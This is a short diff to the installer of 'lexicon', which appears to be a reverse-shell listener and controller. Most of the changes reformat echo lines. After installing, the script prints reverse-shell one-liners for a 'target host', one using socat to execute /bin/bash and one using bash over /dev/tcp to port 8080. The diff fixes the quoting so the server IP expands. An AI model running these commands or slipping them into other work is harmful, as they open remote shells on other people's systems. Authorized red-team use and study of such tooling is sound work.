@@ -13,7 +13,7 @@ if [ ! -d /opt/lexicon ] && [ ! -f /etc/systemd/system/lexicon.service ]; then
 	fi
 
 
-	echo "[X] Installing Dependencies... [X]"
+	echo -e "\n\n[X] Installing Dependencies... [X]"
 	apt-get update
 	if ! command -v socat &> /dev/null 2>&1;
 	then
@@ -62,11 +62,11 @@ if [ ! -d /opt/lexicon ] && [ ! -f /etc/systemd/system/lexicon.service ]; then
 	chmod 755 /usr/local/bin/lexicon
 
 	SERVER_IP=$(hostname -I | awk '{print $1}')
-	echo "[✓] Lexicon installed successfully"
-	echo "Run 'lexicon' to open the controller"
-	echo "Listener running on port 8080, connect on target host with one of the following:"
+	echo -e "\n\n[✓] Lexicon installed successfully\n\n"
+	echo -e "Run 'lexicon' to open the controller\n"
+	echo -e "Listener running on port 8080, connect on target host with one of the following:\n"
 	echo "socat TCP:${SERVER_IP}:8080 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane"
-	echo 'bash -i >& /dev/tcp/${SERVER_IP}/8080 0>&1'
+	echo "bash -i >& /dev/tcp/${SERVER_IP}/8080 0>&1"
 
 else
 	read -p "Lexicon is already installed. Would you like to uninstall? (y/n) " uninstall
